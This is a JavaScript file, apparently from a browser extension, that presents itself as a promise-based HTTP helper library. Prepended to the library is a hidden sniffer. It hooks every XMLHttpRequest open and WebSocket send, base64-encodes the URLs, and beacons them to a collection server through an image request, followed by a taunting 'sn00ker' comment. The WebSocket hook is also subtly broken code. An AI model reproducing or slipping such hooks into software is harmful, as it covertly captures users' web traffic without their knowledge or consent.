function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * helper library - http methods as promises
 * @type {{}}
 * @private
 */
var _lc_http = {

  /**
   * GET method
   * @param url
   * @returns {*|f}
   */
  GET_Promise: function (url) {
    // Return a new promise.
    return new Promise(function (resolve, reject) {
      // Do the usual XHR stuff
      var req = new XMLHttpRequest();
      req.open('GET', url);

      req.onload = function () {
        // This is called even on 404 etc
        // so check the status
        if (req.status == 200) {
          // Resolve the promise with the response text
          resolve(req.response);
        } else if (req.status >= 400) {
          reject(req)
        }
      };

      // Handle network errors
      req.onerror = function () {
        reject(Error("GET request Network Error"));
      };

      // Make the request
      req.send();
    });
  },

  /**
   * POST method
   * @param url
   * @param paramsString
   * @returns {*|f}
   */
  POST_Promise: function (url, paramsString) {
    // Return a new promise.
    return new Promise(function (resolve, reject) {
      // Do the usual XHR stuff
      var req = new XMLHttpRequest();
      req.open('POST', url, true);

      //Send the proper header information along with the request
      req.setRequestHeader("Content-Type", "application/json");


      req.onreadystatechange = function () {//Call a function when the state changes.
        if (req.readyState == 4) {
          if (req.status >= 400) {
            reject(req)
          } else {
            resolve(req.response);
          }
        }
      };

      // Handle network errors
      req.onerror = function () {
        reject(Error("POST request Network Error"));
      };

      // Make the request
      if (paramsString) {
        req.send(paramsString);
      } else {
        req.send();
      }
    });
  },

  /**
   * PUT method
   * @param url
   * @param doc
   * @returns {*|f}
   */
  PUT_Promise: function (url, doc) {

    // Return a new promise.
    return new Promise(function (resolve, reject) {
      // Do the usual XHR stuff
      var req = new XMLHttpRequest();
      req.open('PUT', url, true);

      //TODO:  verify this is the correct header to send
      //Send the proper header information along with the request
      req.setRequestHeader("Content-Type", "application/json; charset=utf-8");
      //req.setRequestHeader("Content-Type", "text/plain; charset=utf-8");

      req.onreadystatechange = function () {//Call a function when the state changes.
        if (req.readyState == 4) {
          if (req.status >= 400) {
            reject(req)
          } else {
            resolve(req.response);
          }
        }
      };

      // Handle network errors
      req.onerror = function (err) {
        reject(Error("PUT request Network Error " + err));
      };

      // Make the request
      if (doc) {
        req.send(doc);
      } else {
        req.send()
      }

    });
  },

  /**
   * DELETE method
   * @param url
   * @param doc
   * @returns {*|f}
   */
  DELETE_Promise: function (url, doc) {
    // Return a new promise.
    return new Promise(function (resolve, reject) {
      // Do the usual XHR stuff
      var req = new XMLHttpRequest();
      req.open('DELETE', url, true);

      //TODO:  verify this is the correct header to send
      //Send the proper header information along with the request
      req.setRequestHeader("Content-Type", "application/json");

      req.onreadystatechange = function () {//Call a function when the state changes.
        if (req.readyState == 4) {
          if (req.status >= 400) {
            reject(req)
          } else {
            resolve(req.response);
          }
        }
      };

      // Handle network errors
      req.onerror = function (err) {
        reject(Error("DELETE request Network Error " + err));
      };

      // Make the request
      if (doc) {
        req.send(doc);
      } else {
        req.send()
      }

    });
  }
};

